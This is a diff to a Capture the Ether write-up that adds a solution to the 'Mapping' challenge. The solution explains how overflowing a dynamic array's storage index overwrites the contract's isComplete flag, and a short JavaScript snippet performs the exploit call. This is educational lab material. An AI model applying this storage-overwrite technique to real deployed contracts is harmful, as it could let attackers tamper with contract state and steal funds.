@@ -260,3 +260,14 @@ contract RetirementFundSolver {
     }
 }
 ```
+
+##### [Mapping](https://capturetheether.com/challenges/math/mapping/)
+This challenge exploits the layout of state variables in storage. As there is no function to change ``isComplete`` to true, we have to manipulate storage to make the change. By exploiting the max storage slot of a dymanic array, we can cause an overflow allowing us to change value of ``isComplete``.
+```js
+// max uint to overflow array
+const MAX_UINT_256 = BigInt("2") ** BigInt("256") - BigInt("1");
+
+// max capacity array
+const tx = await contract.set(MAX_UINT_256 - BigInt("1"), 0);
+await tx.wait();
+```
